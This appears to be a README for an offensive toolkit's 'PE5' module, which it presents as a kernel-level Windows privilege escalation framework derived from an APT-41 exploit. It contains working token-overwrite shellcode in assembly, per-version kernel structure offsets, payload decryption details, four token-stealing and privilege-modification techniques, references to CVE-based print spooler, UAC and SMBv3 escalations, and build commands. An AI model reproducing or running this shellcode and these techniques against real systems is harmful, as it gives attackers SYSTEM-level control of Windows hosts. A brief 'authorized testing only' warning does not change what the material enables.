# PE5 SYSTEM Privilege Escalation Integration

## Overview

This toolkit now uses the **PE5 framework's kernel-level privilege escalation mechanism as THE PRIMARY privilege escalation method**. The PE5 framework is based on APT-41's kernel-level token manipulation exploit, reconstructed from forensic analysis.

## PE5 Framework Mechanism

### Architecture

The PE5 framework achieves SYSTEM privileges through direct kernel memory manipulation:

```
User Mode (Ring 3) → SYSCALL → Kernel Mode (Ring 0) → Token Modification → SYSTEM Privileges
```

### Key Components

1. **XOR Key Derivation**
   - Formula: `key = header[3] ^ header[7]`
   - Expected key: `0xA4`
   - Used for runtime payload decryption

2. **SYSCALL Execution**
   - Location: Offset `0x2C10` in PE5 module
   - Encrypted: `0xAB 0xA1`
   - Decrypted: `0x0F 0x05` (SYSCALL instruction)
   - Transitions from Ring 3 to Ring 0

3. **Token Manipulation**
   - Target: `_EPROCESS.Token` structure
   - Offset: `0x4B8` (Windows 10/11)
   - Modifies `TOKEN.Privileges` at offset `0x40`

### Exploitation Techniques

The PE5 framework provides four exploitation techniques:

1. **Direct Privilege Modification** (Fastest)
   - Directly writes to `TOKEN.Privileges`
   - Sets all privilege bits to `0xFFFFFFFFFFFFFFFF`
   - Execution time: ~1 microsecond

2. **Token Stealing** (Most Reliable)
   - Walks `ActiveProcessLinks` to find SYSTEM (PID 4)
   - Copies SYSTEM token to current process
   - Execution time: ~2 microseconds

3. **Integrity Level Elevation**
   - Modifies token integrity level to System (4)
   - Clears `TOKEN_IS_RESTRICTED` flag
   - Execution time: ~1.5 microseconds

4. **Full Token Takeover** (Most Complete)
   - Complete token manipulation
   - All privileges + System integrity
   - Clears restrictions + fixes audit policy
   - Execution time: ~3 microseconds

## Integration Details

### Module Location

- **Main Module**: `modules/pe5_system_escalation.py`
- **Utilities**: `modules/pe5_utils.py`
- **Framework Source**: `pe5_framework_extracted/pe5_framework/`

### Main Menu Integration

The PE5 module is accessible as option **12** in the main menu:

```
12. [PRIMARY] PE5 SYSTEM Escalation - Kernel-level token manipulation
```

### Module Features

1. **PE5 Kernel Exploit Mechanism** - Detailed explanation of the exploit
2. **Token Manipulation Techniques** - All four exploitation methods
3. **SYSTEM Token Stealing** - Token steal shellcode details
4. **Direct SYSCALL Execution** - Kernel transition mechanism
5. **Windows PE Techniques** - Additional techniques from post-hub
6. **Print Spooler Exploit** - CVE-2020-1337
7. **UAC Bypass** - CVE-2019-1388
8. **SMBv3 Local PE** - CVE-2020-0796
9. **Verify SYSTEM Privileges** - Post-exploitation verification
10. **Generate PE Report** - Comprehensive reporting

## Windows Version Support

### Kernel Structure Offsets

| Version | Token Offset | PID Offset | Links Offset |
|---------|-------------|------------|--------------|
| Windows 10 1909 | 0x360 | 0x2E8 | 0x2F0 |
| Windows 10 2004+ | 0x4B8 | 0x440 | 0x448 |
| Windows 11 | 0x4B8 | 0x440 | 0x448 |
| Server 2019 | 0x360 | 0x2E8 | 0x2F0 |
| Server 2022 | 0x4B8 | 0x440 | 0x448 |

## Usage

### Accessing the Module

1. Launch the toolkit: `python main.py`
2. Select option **12** from the main menu
3. Choose from available functions

### Example: Verify Privileges

```
Select function: 9
```

This will check:
- Current user and SID
- SYSTEM status
- Administrator status
- Elevated token privileges
- Access to protected resources (HKLM)
- SeDebugPrivilege status

### Example: Generate Report

```
Select function: 10
```

This generates a comprehensive JSON report including:
- System information
- Current privileges
- Print Spooler status
- UAC status

## Technical Details

### Token Structure

```c
typedef struct _TOKEN {
    // ... fields before 0x40 ...
    SEP_TOKEN_PRIVILEGES Privileges;  // Offset 0x40
    //   .Present           (+0x40) = 0xFFFFFFFFFFFFFFFF
    //   .Enabled           (+0x48) = 0xFFFFFFFFFFFFFFFF
    //   .EnabledByDefault  (+0x50) = 0xFFFFFFFFFFFFFFFF
    // ... additional fields ...
} TOKEN;
```

### Shellcode (57 bytes)

```asm
; Get current EPROCESS
mov rax, gs:[0x188]              ; KPCR.Prcb.CurrentThread
mov rax, [rax+0xB8]              ; KTHREAD.Process -> EPROCESS

; Get Token pointer
mov rcx, [rax+0x4B8]             ; EPROCESS.Token (EX_FAST_REF)
and rcx, 0xFFFFFFFFFFFFFFF0      ; Clear RefCnt bits

; Modify Privileges
add rcx, 0x40                     ; RCX = &TOKEN.Privileges
mov rdx, 0xFFFFFFFFFFFFFFFF      ; All privileges
mov [rcx], rdx                    ; Present
mov [rcx+8], rdx                  ; Enabled
mov [rcx+0x10], rdx               ; EnabledByDefault

; Return success
xor eax, eax
ret
```

## Enhanced Features from post-hub

The module includes additional Windows privilege escalation techniques:

1. **Print Spooler Exploit (CVE-2020-1337)**
   - PrintDemon vulnerability
   - Arbitrary file write
   - Affects Windows 7/8.1/10, Server 2008-2019

2. **UAC Bypass (CVE-2019-1388)**
   - Windows Certificate Dialog vulnerability
   - Uses hhupd.exe
   - Affects Windows 7/8.1/10

3. **SMBv3 Local PE (CVE-2020-0796)**
   - SMBv3 compression vulnerability
   - Local privilege escalation
   - Affects Windows 10 1903/1909, Server 1903/1909

## MITRE ATT&CK Mapping

- **T1068** - Exploitation for Privilege Escalation
- **T1134** - Access Token Manipulation
- **T1134.001** - Token Impersonation/Theft
- **T1548** - Abuse Elevation Control Mechanism

## Security Considerations

⚠️ **WARNING**: This module documents kernel-level exploitation techniques.

- **Classification**: TLP:RED - Security Research Only
- **Use**: Authorized security testing only
- **Detection**: Kernel-level exploits are difficult to detect without kernel-mode monitoring
- **Mitigation**: Keep systems patched, use kernel-mode security solutions

## References

- PE5 Framework: `pe5_framework_extracted/pe5_framework/README.md`
- APT-41 Attribution: Chinese State-Sponsored Threat Actor
- Windows Internals: 7th Edition (Russinovich, Solomon, Ionescu)
- post-hub Repository: https://github.com/ybdt/post-hub

## Build Instructions

To build the PE5 framework from source:

```bash
cd pe5_framework_extracted/pe5_framework

# Method 1: Python build script
python build.py all

# Method 2: Windows batch script
build.bat all

# Method 3: CMake
mkdir build && cd build
cmake .. -G "Visual Studio 17 2022" -A x64
cmake --build . --config Release

# Method 4: NMAKE
nmake all
```

Build output will be in `build/bin/` directory.

## Notes

- The PE5 framework source code is in C and requires compilation
- Python utilities (`pe5_utils.py`) provide interfaces and documentation
- Actual exploitation requires compiled binaries from the PE5 framework
- This integration provides comprehensive documentation and command generation
